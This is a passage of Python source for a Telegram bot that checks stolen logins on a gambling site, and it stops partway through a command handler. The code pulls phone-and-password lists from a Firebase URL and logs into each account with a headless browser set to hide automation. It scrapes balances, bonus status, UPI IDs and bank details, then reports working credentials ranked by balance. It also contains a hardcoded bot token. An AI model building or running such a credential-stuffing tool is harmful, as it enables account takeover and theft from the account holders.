#!/usr/bin/env python3
"""Yaarwin Bot - ULTIMATE FINAL COMPLETE (Render Ready)"""
import os
import sys
import time
import logging
import requests
import re
import gc
import json
from datetime import datetime, date
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException, NoSuchElementException

BOT_TOKEN = os.getenv("BOT_TOKEN", "8828323902:AAEumblFpZJyq2EkxzuVBe3JIP-HleVwK0c")
PORT = int(os.environ.get("PORT", 10000))
STOP_NOW = False

OFFICIAL_DOMAINS = [
    "yaarwin.click",
    "yaarwin.club",
    "yaarwin.net",
    "yaarwin.org",
    "yaarwin.sbs",
    "yaarwin.xyz",
]

DOMAIN_INDEX = 0
VIP_REQUIREMENTS = {0: 0, 1: 3000, 2: 30000, 3: 200000, 4: 2000000, 5: 20000000}

USER_DATA_FILE = "yaarwin_user_data.json"
SUCCESS_HISTORY_FILE = "yaarwin_success_history.json"

logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)


def get_current_domain():
    global DOMAIN_INDEX
    return OFFICIAL_DOMAINS[DOMAIN_INDEX % len(OFFICIAL_DOMAINS)]


def switch_domain():
    global DOMAIN_INDEX
    old_domain = get_current_domain()
    DOMAIN_INDEX = (DOMAIN_INDEX + 1) % len(OFFICIAL_DOMAINS)
    new_domain = get_current_domain()
    logger.info("Domain switched: " + old_domain + " -> " + new_domain)
    return new_domain


def test_domain(domain):
    try:
        resp = requests.get("https://" + domain, timeout=5, allow_redirects=True)
        return resp.status_code == 200
    except:
        return False


def find_working_domain():
    global DOMAIN_INDEX
    for i in range(len(OFFICIAL_DOMAINS)):
        idx = (DOMAIN_INDEX + i) % len(OFFICIAL_DOMAINS)
        domain = OFFICIAL_DOMAINS[idx]
        if test_domain(domain):
            DOMAIN_INDEX = idx
            logger.info("Working domain found: " + domain)
            return domain
    return get_current_domain()


def get_base_url():
    return "https://" + get_current_domain()


def get_login_url():
    return get_base_url() + "/#/login"


def get_main_url():
    return get_base_url() + "/#/main"


def get_vip_url():
    return get_base_url() + "/#/vip"


def get_first_deposit_url():
    return get_base_url() + "/#/activity/FirstRecharge"


def get_withdraw_url():
    return get_base_url() + "/#/withdraw"


def load_user_data():
    try:
        if os.path.exists(USER_DATA_FILE):
            with open(USER_DATA_FILE, "r") as f:
                return json.load(f)
    except:
        pass
    return {}


def save_user_data(data):
    try:
        with open(USER_DATA_FILE, "w") as f:
            json.dump(data, f, indent=2)
    except:
        pass


def get_user_data(user_id):
    all_data = load_user_data()
    user_id_str = str(user_id)
    if user_id_str not in all_data:
        all_data[user_id_str] = {"firebase_url": None, "skip_count": 0}
        save_user_data(all_data)
    return all_data[user_id_str]


def set_user_data(user_id, key, value):
    all_data = load_user_data()
    user_id_str = str(user_id)
    if user_id_str not in all_data:
        all_data[user_id_str] = {"firebase_url": None, "skip_count": 0}
    all_data[user_id_str][key] = value
    save_user_data(all_data)


def load_success_history():
    try:
        if os.path.exists(SUCCESS_HISTORY_FILE):
            with open(SUCCESS_HISTORY_FILE, "r") as f:
                return json.load(f)
    except:
        pass
    return {}


def save_success_history(data):
    try:
        with open(SUCCESS_HISTORY_FILE, "w") as f:
            json.dump(data, f, indent=2)
    except:
        pass


def add_success(user_id, result):
    history = load_success_history()
    user_id_str = str(user_id)
    if user_id_str not in history:
        history[user_id_str] = []
    result_copy = dict(result)
    result_copy["timestamp"] = time.strftime("%Y-%m-%d %H:%M:%S")
    result_copy["time"] = time.strftime("%I:%M %p")
    result_copy["date"] = time.strftime("%Y-%m-%d")
    history[user_id_str].append(result_copy)
    save_success_history(history)


def get_user_success(user_id):
    history = load_success_history()
    user_id_str = str(user_id)
    return history.get(user_id_str, [])


def get_user_success_by_date(user_id, target_date):
    all_success = get_user_success(user_id)
    if target_date.lower() == "today":
        target_date = time.strftime("%Y-%m-%d")
    return [s for s in all_success if s.get("date", "") == target_date]


def clear_user_success(user_id):
    history = load_success_history()
    user_id_str = str(user_id)
    if user_id_str in history:
        history[user_id_str] = []
        save_success_history(history)


def fetch_firebase(url):
    try:
        if not url.endswith(".json"):
            url = url.rstrip("/") + "/.json"

        all_data = {}
        last_key = None
        batch = 0

        while True:
            batch += 1
            if last_key:
                query_url = url + '?orderBy="$key"&limitToFirst=100&startAfter="' + str(last_key) + '"'
            else:
                query_url = url + '?orderBy="$key"&limitToFirst=100'

            resp = requests.get(query_url, timeout=120)
            if resp.status_code != 200:
                logger.error("HTTP Error: " + str(resp.status_code))
                break

            data = resp.json()
            if not data:
                break

            all_data.update(data)
            logger.info("Batch " + str(batch) + ": " + str(len(data)) + " | Total: " + str(len(all_data)))

            if len(data) < 100:
                break

            last_key = list(data.keys())[-1]

        logger.info("TOTAL FETCHED: " + str(len(all_data)) + " accounts")
        return all_data if all_data else None

    except Exception as e:
        logger.error("Firebase error: " + str(e))
        return None


def parse_balance(balance_str):
    try:
        clean = balance_str.replace("₹", "").replace(",", "").strip()
        return float(clean)
    except:
        return 0.0


class GameBot:
    def __init__(self, phone, password):
        self.phone = phone
        self.password = password
        self.driver = None
        self.wallet = "N/A"
        self.vip_level = "0"
        self.vip_bet_progress = ""
        self.vip_level_up_rewards = []
        self.first_deposit = []
        self.upi_id = None
        self.upi_name = None
        self.bank_name = None
        self.bank_number = None
        self.upi_status = "Not Added"
        self.bank_status = "Not Added"
        self.success = False
        self.reason = ""
        self.arwallet = "N/A"
        self.safe_balance = "N/A"
        self.withdrawable = "N/A"
        self.total_exp = "0"
        self.payout_days = "0"
        self.vip_status = ""
        self.current_domain = get_current_domain()
        self.domain_switched = False

    def setup(self):
        try:
            opts = Options()
            opts.add_argument("--no-sandbox")
            opts.add_argument("--disable-dev-shm-usage")
            opts.add_argument("--disable-gpu")
            opts.add_argument("--headless=new")
            opts.add_argument("--disable-blink-features=AutomationControlled")
            opts.add_argument("--window-size=375,812")
            opts.add_argument("--user-agent=Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36")
            opts.add_argument("--disable-extensions")
            opts.add_argument("--disable-plugins")
            opts.add_argument("--disable-images")
            opts.add_argument("--no-first-run")
            opts.add_argument("--no-default-browser-check")
            opts.add_argument("--single-process")

            driver = None
            try:
                driver = webdriver.Chrome(options=opts)
            except Exception as e:
                self.reason = "Chrome setup error: " + str(e)[:60]
                return False

            if not driver:
                self.reason = "Chrome not found"
                return False

            self.driver = driver
            self.driver.set_page_load_timeout(45)
            self.driver.implicitly_wait(3)
            self.driver.set_script_timeout(30)
            return True
        except Exception as e:
            self.reason = "Chrome error: " + str(e)[:60]
            return False

    def check_stop(self):
        global STOP_NOW
        return STOP_NOW

    def wait_for_element(self, by, value, timeout=3):
        try:
            return WebDriverWait(self.driver, timeout).until(
                EC.presence_of_element_located((by, value))
            )
        except:
            return None

    def get_page_text(self):
        try:
            return self.driver.find_element(By.TAG_NAME, "body").text
        except:
            return ""

    def get_page_source(self):
        try:
            return self.driver.page_source
        except:
            return ""

    def is_login_error(self, page_text):
        lower_text = page_text.lower()
        error_patterns = [
            "wrong account or password", "error: 147", "user has been locked",
            "error: 116", "account locked", "user locked", "account has been locked",
            "user has been disabled", "account disabled", "wrong password",
            "incorrect password", "invalid credentials", "login failed"
        ]
        for pattern in error_patterns:
            if pattern in lower_text:
                return True
        return False

    def get_login_error_reason(self, page_text):
        lower_text = page_text.lower()
        if "user has been locked" in lower_text or "error: 116" in lower_text or "account locked" in lower_text:
            return "User has been locked - SKIP"
        if "wrong account or password" in lower_text or "error: 147" in lower_text or "wrong password" in lower_text:
            return "Wrong account or password - SKIP"
        if "user has been disabled" in lower_text or "account disabled" in lower_text:
            return "Account disabled - SKIP"
        return "Login failed"

    def try_with_domain_switch(self, url_func, wait=1, max_switches=3):
        global DOMAIN_INDEX
        original_domain = get_current_domain()
        switches = 0

        while switches < max_switches:
            url = url_func()
            try:
                self.driver.get(url)
                if wait > 0:
                    time.sleep(wait)
                return True, None
            except TimeoutException:
                return True, None
            except Exception as e:
                error_msg = str(e)[:40]
                if any(err in error_msg.lower() for err in ["net::", "err_", "dns", "connection", "refused", "unreachable"]):
                    switches += 1
                    if switches < max_switches:
                        new_domain = switch_domain()
                        self.domain_switched = True
                        self.current_domain = new_domain
                        logger.warning("Domain switch " + str(switches) + ": " + original_domain + " -> " + new_domain)
                        time.sleep(2)
                        continue
                return False, error_msg

        return False, "All domains failed"

    def fast_login(self):
        global STOP_NOW
        try:
            if self.check_stop():
                self.reason = "Stopped"
                return False

            success, error = self.try_with_domain_switch(get_login_url, 1)
            if not success:
                self.reason = error or "Page load failed"
                return False

            if self.check_stop():
                self.reason = "Stopped"
                return False

            time.sleep(1.5)

            page_text = self.get_page_text()
            if not page_text or len(page_text) < 50:
                success, error = self.try_with_domain_switch(get_login_url, 1)
                if not success:
                    self.reason = "Page not loaded"
                    return False
                page_text = self.get_page_text()
                if not page_text or len(page_text) < 50:
                    self.reason = "Page not loaded"
                    return False

            try:
                inputs = self.driver.find_elements(By.TAG_NAME, "input")
                for inp in inputs:
                    if inp.is_displayed() and inp.get_attribute("type") != "password":
                        try:
                            inp.click()
                            time.sleep(0.5)
                            opts = self.driver.find_elements(By.CSS_SELECTOR, ".van-dropdown-item__option, .van-cell")
                            for opt in opts:
                                if "India" in opt.text or "+91" in opt.text:
                                    opt.click()
                                    time.sleep(0.5)
                                    break
                            break
                        except:
                            continue
            except:
                pass

            phone_in = None
            for sel in ['input[name="userNumber"]', 'input[type="tel"]', "input.van-field__control"]:
                try:
                    phone_in = self.wait_for_element(By.CSS_SELECTOR, sel, timeout=2)
                    if phone_in and phone_in.is_displayed():
                        break
                except:
                    continue

            if not phone_in:
                inputs = self.driver.find_elements(By.TAG_NAME, "input")
                for inp in inputs:
                    try:
                        if inp.is_displayed() and inp.get_attribute("type") != "password":
                            phone_in = inp
                            break
                    except:
                        continue

            if not phone_in:
                self.reason = "Phone input not found"
                return False

            phone_in.clear()
            time.sleep(0.3)
            phone_in.send_keys(self.phone)
            time.sleep(0.3)

            pwd_in = None
            for sel in ['input[type="password"]', 'input[name="password"]']:
                try:
                    pwd_in = self.wait_for_element(By.CSS_SELECTOR, sel, timeout=2)
                    if pwd_in and pwd_in.is_displayed():
                        break
                except:
                    continue

            if not pwd_in:
                inputs = self.driver.find_elements(By.TAG_NAME, "input")
                for inp in inputs:
                    try:
                        if inp.get_attribute("type") == "password":
                            pwd_in = inp
                            break
                    except:
                        continue

            if not pwd_in:
                self.reason = "Password input not found"
                return False

            pwd_in.clear()
            time.sleep(0.3)
            pwd_in.send_keys(self.password)
            time.sleep(0.3)

            if self.check_stop():
                self.reason = "Stopped"
                return False

            btn = None
            for sel in ["button.active", "button.van-button--primary", 'button[type="submit"]']:
                try:
                    btn = self.wait_for_element(By.CSS_SELECTOR, sel, timeout=2)
                    if btn:
                        break
                except:
                    continue

            if not btn:
                btns = self.driver.find_elements(By.TAG_NAME, "button")
                for b in btns:
                    try:
                        if any(w in b.text.lower() for w in ["login", "sign", "log in", "submit"]):
                            btn = b
                            break
                    except:
                        continue

            if not btn:
                self.reason = "Login button not found"
                return False

            try:
                btn.click()
            except:
                try:
                    self.driver.execute_script("arguments[0].click();", btn)
                except:
                    self.reason = "Cannot click login"
                    return False

            login_success = False
            for i in range(3):
                if self.check_stop():
                    self.reason = "Stopped"
                    return False

                time.sleep(1.5)
                current_url = self.driver.current_url
                page_text = self.get_page_text()

                if self.is_login_error(page_text):
                    self.reason = self.get_login_error_reason(page_text)
                    return False

                if "login" not in current_url:
                    if any(k in page_text.lower() for k in ["balance", "wallet", "₹", "home", "main", "vip", "activity"]):
                        login_success = True
                        break

            if login_success:
                self.success = True
                time.sleep(1)
                return True
            else:
                page_text = self.get_page_text()
                if self.is_login_error(page_text):
                    self.reason = self.get_login_error_reason(page_text)
                    return False
                self.reason = "Login timeout"
                return False

        except Exception as e:
            self.reason = "Error: " + str(e)[:60]
            return False

    def get_all_details_real(self):
        try:
            self._extract_main_page()
            self._extract_vip_real()
            self._extract_first_deposit()
            self._extract_payment()
        except Exception as e:
            logger.error("Get details error: " + str(e))

    def _extract_main_page(self):
        try:
            success, error = self.try_with_domain_switch(get_main_url, 1)
            if not success:
                return
            time.sleep(1.5)
            if self.check_stop():
                return

            page_text = self.get_page_text()
            lines = page_text.split("\n")

            for i, line in enumerate(lines):
                lower_line = line.lower().strip()
                if any(label in lower_line for label in ["available balance", "total balance", "wallet balance", "balance"]):
                    for j in range(i + 1, min(i + 5, len(lines))):
                        match = re.search(r"₹\s*([\d,]+\.?\d*)", lines[j].strip())
                        if match:
                            self.wallet = "₹" + match.group(1)
                            break
                    break

            if self.wallet == "N/A":
                for line in lines[:25]:
                    match = re.search(r"₹\s*([\d,]+\.?\d*)", line.strip())
                    if match:
                        try:
                            float(match.group(1).replace(",", ""))
                            self.wallet = "₹" + match.group(1)
                            break
                        except:
                            pass

            for i, line in enumerate(lines):
                if "arpay" in line.lower() or "arwallet" in line.lower():
                    for j in range(i + 1, min(i + 4, len(lines))):
                        match = re.search(r"₹\s*([\d,]+\.?\d*)", lines[j].strip())
                        if match:
                            self.arwallet = "₹" + match.group(1)
                            break
                    break

            for i, line in enumerate(lines):
                if line.lower().strip() == "safe":
                    for j in range(i + 1, min(i + 4, len(lines))):
                        match = re.search(r"₹\s*([\d,]+\.?\d*)", lines[j].strip())
                        if match:
                            self.safe_balance = "₹" + match.group(1)
                            break
                    break

            for line in lines:
                if "withdrawable" in line.lower():
                    match = re.search(r"₹\s*([\d,]+\.?\d*)", line)
                    if match:
                        self.withdrawable = "₹" + match.group(1)
                        break

        except Exception as e:
            logger.error("Main page error: " + str(e))

    def _extract_vip_real(self):
        try:
            success, error = self.try_with_domain_switch(get_vip_url, 1)
            if not success:
                return
            time.sleep(1.5)
            if self.check_stop():
                return

            vip_text = self.get_page_text()
            vip_lines = vip_text.split("\n")
            vip_source = self.get_page_source()

            current_vip = "0"
            for line in vip_lines[:15]:
                vip_match = re.search(r"VIP\s*(\d+)", line, re.IGNORECASE)
                if vip_match:
                    current_vip = vip_match.group(1)
                    break

            if not current_vip:
                src_match = re.search(r"VIP\s*(\d+)", vip_source[:5000], re.IGNORECASE)
                if src_match:
                    current_vip = src_match.group(1)

            self.vip_level = current_vip

            for i, line in enumerate(vip_lines):
                if "my experience" in line.lower():
                    if i > 0:
                        exp_match = re.search(r"(\d+(?:,\d+)*)\s*EXP", vip_lines[i-1])
                        if exp_match:
                            self.total_exp = exp_match.group(1)
                    exp_match2 = re.search(r"(\d+(?:,\d+)*)\s*EXP", line)
                    if exp_match2:
                        self.total_exp = exp_match2.group(1)
                    break

            for i, line in enumerate(vip_lines):
                if "payout time" in line.lower():
                    if i > 0:
                        days_match = re.search(r"(\d+)\s*Days", vip_lines[i-1])
                        if days_match:
                            self.payout_days = days_match.group(1)
                    break

            all_progress = []
            for line in vip_lines:
                bet_match = re.search(r"(\d{1,3}(?:,\d{3})*)\s*/\s*(\d{1,3}(?:,\d{3})*)", line)
                if bet_match:
                    current_str = bet_match.group(1).replace(",", "")
                    total_str = bet_match.group(2).replace(",", "")
                    try:
                        current = int(current_str)
                        total = int(total_str)
                        all_progress.append({
                            "current": current,
                            "total": total,
                            "text": bet_match.group(1) + "/" + bet_match.group(2)
                        })
                    except:
                        pass

            total_exp_val = 0
            if self.total_exp != "0":
                try:
                    total_exp_val = int(self.total_exp.replace(",", ""))
                except:
                    pass

            achieved_vip = 0
            for lvl in range(5, -1, -1):
                req = VIP_REQUIREMENTS.get(lvl, 0)
                if total_exp_val >= req and req > 0:
                    achieved_vip = lvl
                    break

            if achieved_vip == 0 and total_exp_val > 0:
                if total_exp_val >= 3000:
                    achieved_vip = 1

            self.vip_level = str(achieved_vip)
            next_vip = achieved_vip + 1
            next_req = VIP_REQUIREMENTS.get(next_vip, 0)
            bet_progress = ""

            for prog in all_progress:
                if prog["total"] == next_req:
                    bet_progress = prog["text"]
                    break

            if not bet_progress and next_req > 0:
                bet_progress = self.total_exp + "/" + str(next_req)

            self.vip_bet_progress = bet_progress

            if achieved_vip > 0:
                self.vip_status = "VIP" + str(achieved_vip) + " ✅"
                if next_vip <= 5 and next_req > 0:
                    self.vip_status += " | VIP" + str(next_vip) + ": " + bet_progress
            else:
                self.vip_status = "VIP0 | VIP1: " + bet_progress if bet_progress else "VIP0"

            reward_amount = None
            reward_status = "Unknown"
            monthly_amount = None
            monthly_status = "Unknown"
            in_level_up = False
            in_monthly = False

            for line in vip_lines:
                line_stripped = line.strip()
                lower_line = line_stripped.lower()

                if "level up rewards" in lower_line:
                    in_level_up = True
                    in_monthly = False
                    continue
                if "monthly reward" in lower_line:
                    in_level_up = False
                    in_monthly = True
                    continue
                if "safe" in lower_line or "rebate rate" in lower_line:
                    in_level_up = False
                    in_monthly = False
                    continue

                if in_level_up:
                    if lower_line == "receive":
                        reward_status = "Receive"
                    elif lower_line == "received":
                        reward_status = "Received"
                    elif not reward_amount:
                        amt_match = re.search(r"^(\d{1,3}(?:,\d{3})*|\d+)$", line_stripped)
                        if amt_match:
                            val_str = amt_match.group(1).replace(",", "")
                            try:
                                val = int(val_str)
                                if 10 <= val <= 100000:
                                    reward_amount = amt_match.group(1)
                            except:
                                pass

                if in_monthly:
                    if lower_line == "receive":
                        monthly_status = "Receive"
                    elif lower_line == "received":
                        monthly_status = "Received"
                    elif not monthly_amount:
                        amt_match = re.search(r"^(\d{1,3}(?:,\d{3})*|\d+)$", line_stripped)
                        if amt_match:
                            val_str = amt_match.group(1).replace(",", "")
                            try:
                                val = int(val_str)
                                if 10 <= val <= 100000:
                                    monthly_amount = amt_match.group(1)
                            except:
                                pass

            self.vip_level_up_rewards = []
            if reward_amount:
                self.vip_level_up_rewards.append({
                    "amount": reward_amount,
                    "status": reward_status
                })
            if monthly_amount:
                self.vip_level_up_rewards.append({
                    "amount": monthly_amount,
                    "status": monthly_status,
                    "type": "Monthly"
                })

        except Exception as e:
            logger.error("VIP extract error: " + str(e))

    def _extract_first_deposit(self):
        try:
            success, error = self.try_with_domain_switch(get_first_deposit_url, 1)
            if not success:
                return
            time.sleep(1.5)
            if self.check_stop():
                return

            fd_text = self.get_page_text()
            fd_lines = fd_text.split("\n")
            deposit_sections = []
            current_section = None

            for line in fd_lines:
                line_stripped = line.strip()
                lower_line = line_stripped.lower()

                fd_match = re.search(r"first\s*deposit\s*(\d+)", lower_line)
                if fd_match:
                    if current_section:
                        deposit_sections.append(current_section)
                    current_section = {
                        "amount": fd_match.group(1),
                        "progress": None,
                        "bonus": None,
                        "has_receive": False,
                        "has_deposit_btn": False,
                        "has_received": False
                    }
                    continue

                if current_section:
                    prog_match = re.search(r"^(\d+)/(\d+)$", line_stripped)
                    if prog_match:
                        current_section["progress"] = line_stripped
                        continue
                    bonus_match = re.search(r"[+]?\s*₹\s*([\d,]+\.?\d*)", line_stripped)
                    if bonus_match and not current_section["bonus"]:
                        current_section["bonus"] = bonus_match.group(1)
                        continue
                    if lower_line == "receive":
                        current_section["has_receive"] = True
                    elif lower_line == "deposit":
                        current_section["has_deposit_btn"] = True
                    elif lower_line == "received":
                        current_section["has_received"] = True

            if current_section:
                deposit_sections.append(current_section)

            for section in deposit_sections:
                progress = section.get("progress")
                if progress:
                    prog_match = re.search(r"^(\d+)/(\d+)$", progress)
                    if prog_match:
                        current = int(prog_match.group(1))
                        total = int(prog_match.group(2))
                        if current >= total and section["has_receive"] and not section["has_deposit_btn"] and not section["has_received"]:
                            dep_amount = section["amount"]
                            bonus = section.get("bonus")
                            if bonus:
                                self.first_deposit.append("First Deposit " + dep_amount + ": COMPLETE | Bonus ₹" + bonus + " | ❌ Claim Available")
                            else:
                                self.first_deposit.append("First Deposit " + dep_amount + ": COMPLETE | ❌ Claim Available")
        except:
            pass

    def _extract_payment(self):
        try:
            success, error = self.try_with_domain_switch(get_withdraw_url, 1)
            if not success:
                return
            time.sleep(1)
            if self.check_stop():
                return

            wd_text = self.get_page_text()
            wd_lines = wd_text.split("\n")

            upi_match = re.search(r"([a-zA-Z0-9._-]+@[a-zA-Z]+)", wd_text)
            if upi_match:
                self.upi_id = upi_match.group(1)
                self.upi_status = "Added: " + self.upi_id
                for i, line in enumerate(wd_lines):
                    if self.upi_id in line:
                        if i > 0:
                            prev = wd_lines[i - 1].strip()
                            if prev and len(prev) < 50:
                                self.upi_name = prev
                                self.upi_status = "Added: " + self.upi_name + " (" + self.upi_id + ")"
                        break
            else:
                has_add_upi = any("add upi" in line.lower() for line in wd_lines)
                self.upi_status = "Not Added" if has_add_upi else "Available" if "upi" in wd_text.lower() else "Not Added"

            bank_patterns = [
                r"(Punjab National|PNB|SBI|HDFC|ICICI|Axis|Bank of Baroda|BOB|Canara|Union|Indian|Central|UCO|IDBI|Kotak|Yes|IndusInd|Federal|South Indian|Karur Vysya|Tamilnad Mercantile|Dhanlaxmi|Lakshmi Vilas|RBL|Bandhan|CSB|ESAF|Jana|Equitas|Ujjivan|AU Small|Fincare|North East|Paytm Payments|Airtel Payments|India Post|Jio Payments|jio payment|NSDL|CDSL|jio).*?(\d{2,4}\*{2,6}\d{2,4})",
                r"(\d{2,4}\*{2,6}\d{2,4})",
            ]
            for pattern in bank_patterns:
                bank_match = re.search(pattern, wd_text, re.IGNORECASE)
                if bank_match:
                    groups = bank_match.groups()
                    if len(groups) >= 2:
                        self.bank_name = groups[0].strip()
                        self.bank_number = groups[1].strip()
                    else:
                        self.bank_number = groups[0].strip() if groups else None

                    if not self.bank_name and self.bank_number:
                        for i, line in enumerate(wd_lines):
                            if self.bank_number in line:
                                if i > 0:
                                    prev = wd_lines[i - 1].strip()
                                    if prev and len(prev) < 50:
                                        self.bank_name = prev
                                break

                    if self.bank_name and self.bank_number:
                        self.bank_status = "Added: " + self.bank_name + " " + self.bank_number
                    elif self.bank_name:
                        self.bank_status = "Added: " + self.bank_name
                    elif self.bank_number:
                        self.bank_status = "Added: " + self.bank_number
                    else:
                        self.bank_status = "Added"
                    break
            else:
                has_add_bank = any("add bank" in line.lower() or "add bank card" in line.lower() for line in wd_lines)
                self.bank_status = "Not Added" if has_add_bank else "Available" if "bank" in wd_text.lower() else "Not Added"
        except:
            pass

    def close(self):
        if self.driver:
            try:
                self.driver.quit()
            except:
                pass
            self.driver = None
        gc.collect()


def sort_by_balance(success_list):
    def get_balance(item):
        return parse_balance(item.get("balance", "₹0"))
    return sorted(success_list, key=get_balance, reverse=True)


def format_success_entry(s, idx=None):
    msg = ""
    if idx is not None:
        msg += "┌─────────────────────┐\n"
        msg += "│ #" + str(idx + 1) + " | " + s.get("time", "?") + "\n"
    else:
        msg += "┌─────────────────────┐\n"

    msg += (
        "│ 📱 " + s.get("phone", "N/A") + "\n"
        "│ 🔑 " + s.get("password", "N/A") + "\n"
        "│ 💰 " + s.get("balance", "N/A") + "\n"
    )

    if s.get("withdrawable") and s["withdrawable"] != "N/A":
        msg += "│ 💵 Withdrawable: " + s["withdrawable"] + "\n"
    if s.get("safe") and s["safe"] != "N/A":
        msg += "│ 🛡️ Safe: " + s["safe"] + "\n"
    if s.get("arwallet") and s["arwallet"] != "N/A":
        msg += "│ 💳 ARWallet: " + s["arwallet"] + "\n"

    if s.get("vip_status"):
        msg += "│ 👑 " + s["vip_status"] + "\n"
    elif s.get("vip_level") and s["vip_level"] != "0":
        msg += "│ 👑 VIP: " + s["vip_level"] + "\n"
        if s.get("vip_bet_progress"):
            msg += "│ 📈 Bet: " + s["vip_bet_progress"] + "\n"
    else:
        msg += "│ 👑 VIP 0\n"

    if s.get("total_exp") and s["total_exp"] != "0":
        msg += "│ 📊 Total EXP: " + s["total_exp"] + "\n"
    if s.get("payout_days") and s["payout_days"] != "0":
        msg += "│ 📅 Payout: " + s["payout_days"] + " Days\n"

    if s.get("vip_level_up_rewards"):
        for reward in s["vip_level_up_rewards"]:
            r_type = reward.get("type", "Level Up")
            amt = reward.get("amount", "0")
            status = reward.get("status", "Unknown")
            if status == "Receive":
                msg += "│ 🟢 " + r_type + ": ₹" + amt + " | Receive (GREEN)\n"
            elif status == "Received":
                msg += "│ ⬜ " + r_type + ": ₹" + amt + " | Received (Done)\n"
            else:
                msg += "│ ❓ " + r_type + ": ₹" + amt + " | " + status + "\n"

    if s.get("first_deposit"):
        for dep in s["first_deposit"]:
            msg += "│ 🎉 " + dep + "\n"

    msg += "└─────────────────────┘\n\n"
    return msg


async def send_success_list(update, success_list, title, filter_fn=None, date_filter=None):
    if filter_fn:
        filtered = [s for s in success_list if filter_fn(s)]
    else:
        filtered = success_list

    if not filtered:
        await update.message.reply_text("📭 No records found!")
        return

    sorted_list = sort_by_balance(filtered)

    msg = title + "\n"
    msg += "═══════════════════════\n"
    msg += "Total: " + str(len(sorted_list)) + " IDs\n\n"

    for idx, s in enumerate(sorted_list):
        msg += format_success_entry(s, idx)

        if (idx + 1) % 3 == 0:
            try:
                await update.message.reply_text(msg)
            except:
                pass
            msg = ""

    if msg.strip():
        try:
            await update.message.reply_text(msg)
        except:
            pass

    await update.message.reply_text("═══════════════════════\n✅ Total: " + str(len(sorted_list)))


async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_data = get_user_data(user_id)
    current = get_current_domain()

    msg = (
        "🎮 Yaarwin Bot - ULTIMATE v26\n"
        "🌐 Current Domain: " + current + "\n"
        "🔄 Auto-switch: ON\n\n"
        "Commands:\n"
        "/setfirebase <url> - Set Firebase URL\n"
        "/setskip <number> - Set skip count\n"
        "/login - Start login (FAST SERIAL)\n"
        "/stop - STOP\n\n"
        "📊 Filter Commands:\n"
        "/success - ALL (sorted by balance)\n"
        "/success today - TODAY only\n"
        "/balance - Only with money\n"
        "/balance today - TODAY only\n"
        "/firstdeposit - Only with claimable FD\n"
        "/firstdeposit today - TODAY only\n"
        "/vip - Only with VIP rewards\n"
        "/vip today - TODAY only\n"
        "/nobalance - Only zero balance\n"
        "/nobalance today - TODAY only\n\n"
        "/clearsuccess - Clear\n"
        "/status - Settings"
    )

    if user_data.get("firebase_url"):
        msg += "\n✅ Firebase Set | Skip: " + str(user_data.get("skip_count", 0))
    else:
        msg += "\n❌ Set Firebase! /setfirebase <url>"

    await update.message.reply_text(msg)


async def setfirebase_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not context.args:
        await update.message.reply_text("Usage: /setfirebase <url>")
        return
    firebase_url = context.args[0]
    set_user_data(user_id, "firebase_url", firebase_url)
    await update.message.reply_text("✅ Firebase Set!\n" + firebase_url + "\n\nNext: /setskip then /login")


async def setskip_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not context.args:
        await update.message.reply_text("Usage: /setskip <number>")
        return
    try:
        skip = int(context.args[0])
        if skip < 0:
            skip = 0
        set_user_data(user_id, "skip_count", skip)
        await update.message.reply_text("✅ Skip: " + str(skip) + "\nSend /login")
    except:
        await update.message.reply_text("❌ Enter a number!")


async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global STOP_NOW
    STOP_NOW = True
    await update.message.reply_text("🛑 STOPPED!")


async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_data = get_user_data(user_id)
    success_list = get_user_success(user_id)
    current = get_current_domain()
    msg = (
        "ℹ️ Settings:\n"
        "🌐 Domain: " + current + "\n"
        "Firebase: " + ("✅" if user_data.get("firebase_url") else "❌") + "\n"
        "Skip: " + str(user_data.get("skip_count", 0)) + "\n"
        "History: " + str(len(success_list)) + " IDs"
    )
    await update.message.reply_text(msg)


async def success_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if context.args and context.args[0].lower() == "today":
        success_list = get_user_success_by_date(user_id, "today")
        title = "📊 TODAY SUCCESS (Sorted by Balance)"
    else:
        success_list = get_user_success(user_id)
        title = "📊 ALL SUCCESS (Sorted by Balance)"

    if not success_list:
        await update.message.reply_text("📭 No history! Run /login first.")
        return

    await send_success_list(update, success_list, title)


async def balance_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if context.args and context.args[0].lower() == "today":
        success_list = get_user_success_by_date(user_id, "today")
        title = "💰 TODAY WITH BALANCE (High to Low)"
    else:
        success_list = get_user_success(user_id)
        title = "💰 WITH BALANCE (High to Low)"

    def has_balance(s):
        bal = parse_balance(s.get("balance", "₹0"))
        return bal > 0

    await send_success_list(update, success_list, title, has_balance)


async def firstdeposit_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if context.args and context.args[0].lower() == "today":
        success_list = get_user_success_by_date(user_id, "today")
        title = "🎉 TODAY WITH FIRST DEPOSIT BONUS"
    else:
        success_list = get_user_success(user_id)
        title = "🎉 WITH FIRST DEPOSIT BONUS"

    def has_first_deposit(s):
        return bool(s.get("first_deposit"))

    await send_success_list(update, success_list, title, has_first_deposit)


async def vip_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if context.args and context.args[0].lower() == "today":
        success_list = get_user_success_by_date(user_id, "today")
        title = "👑 TODAY VIP WITH GREEN/RECEIVE REWARDS"
    else:
        success_list = get_user_success(user_id)
        title = "👑 VIP WITH GREEN/RECEIVE REWARDS"

    def has_vip_rewards(s):
        if s.get("vip_level_up_rewards"):
            for reward in s["vip_level_up_rewards"]:
                if reward.get("status") == "Receive":
                    return True
